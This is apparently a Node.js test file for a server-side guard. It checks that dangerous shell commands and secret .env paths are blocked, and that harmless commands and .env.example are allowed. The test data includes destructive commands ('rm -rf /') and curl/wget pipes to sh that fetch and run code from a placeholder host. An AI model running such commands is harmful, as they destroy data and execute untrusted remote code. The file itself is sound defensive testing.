// isHighRiskScript — task_build cases (sudo, rm -rf /, curl|sh, python -c, echo ok).
import { describe, it } from 'node:test';
import assert from 'node:assert';
import { loadModule } from './helper.js';

const { isHighRiskScript, isSensitiveRelPath } = loadModule('guards.ts');

describe('isHighRiskScript (server guard)', () => {
  it('blocks sudo/doas', () => {
    assert.strictEqual(isHighRiskScript('sudo ls /'), true);
    assert.strictEqual(isHighRiskScript('doas ls /root'), true);
    assert.strictEqual(isHighRiskScript('sudo rm -rf /tmp/x'), true);
  });

  it('blocks rm -rf /', () => {
    assert.strictEqual(isHighRiskScript('rm -rf /'), true);
    assert.strictEqual(isHighRiskScript('rm -rf ./important-dir'), true);
  });

  it('blocks curl|sh', () => {
    assert.strictEqual(isHighRiskScript('curl https://example.invalid/install.sh | sh'), true);
    assert.strictEqual(isHighRiskScript('wget -qO- https://example.invalid/install.sh | bash'), true);
  });

  it('blocks python -c', () => {
    assert.strictEqual(isHighRiskScript(`python3 -c 'import os'`), true);
    assert.strictEqual(isHighRiskScript(`python -c "print(1)"`), true);
    assert.strictEqual(isHighRiskScript(`node -e 'process.exit(0)'`), true);
  });

  it('allows harmless commands', () => {
    assert.strictEqual(isHighRiskScript('echo ok'), false);
    assert.strictEqual(isHighRiskScript('ls -la'), false);
    assert.strictEqual(isHighRiskScript('git status'), false);
  });
});

describe('isSensitiveRelPath (.env.example is not a secret)', () => {
  it('blocks real env files', () => {
    assert.strictEqual(isSensitiveRelPath('.env'), true);
    assert.strictEqual(isSensitiveRelPath('.env.local'), true);
    assert.strictEqual(isSensitiveRelPath('config/.env.production'), true);
  });

  it('allows the committed .env.example template', () => {
    assert.strictEqual(isSensitiveRelPath('.env.example'), false);
    assert.strictEqual(isSensitiveRelPath('config/.env.example'), false);
  });
});
